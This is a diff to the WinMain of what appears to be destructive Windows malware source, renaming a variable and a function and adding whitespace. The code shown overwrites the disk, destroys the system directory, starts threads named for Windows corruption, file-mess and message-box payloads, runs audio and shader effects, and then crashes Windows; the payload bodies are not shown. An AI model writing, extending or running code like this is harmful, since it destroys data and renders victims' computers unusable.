@@ -4,9 +4,11 @@
 void InitDPI() {
 	HMODULE hModUser32 = LoadLibrary(L"user32.dll");
 	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModUser32, "SetProcessDPIAware");
+	
 	if (SetProcessDPIAware) {
 		SetProcessDPIAware();
 	}
+
 	FreeLibrary(hModUser32);
 }
 
@@ -25,11 +27,11 @@ int WinMain(
 		ExitProcess(0);
 	}
 
-	WCHAR szSystemDirectory[MAX_PATH] = { 0 };
-	GetSystemDirectory(szSystemDirectory, MAX_PATH);
+	WCHAR SystemDirectory[MAX_PATH] = { 0 };
+	GetSystemDirectory(SystemDirectory, MAX_PATH);
 
-	WriteDisk();
-	DestroyDirectory(szSystemDirectory);
+	OverWriteDisk();
+	DestroyDirectory(SystemDirectory);
 
 	AUDIO_SEQUENCE_PARAMS pAudioSequences[AUDIO_NUM] = {0};
 	pAudioSequences[0] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence1 };
@@ -79,7 +81,7 @@ int WinMain(
 	ExecuteShader(Shader16, PAYLOAD_TIME);
 
 	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(WindowsCorruptionPayload), NULL, 0, NULL);
-	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(FileMessPayload), (PVOID)szSystemDirectory, 0, NULL);
+	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(FileMessPayload), (PVOID)SystemDirectory, 0, NULL);
 	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(MessageBoxPayload), NULL, 0, NULL);
 	Sleep(20000);
 	CrashWindows();
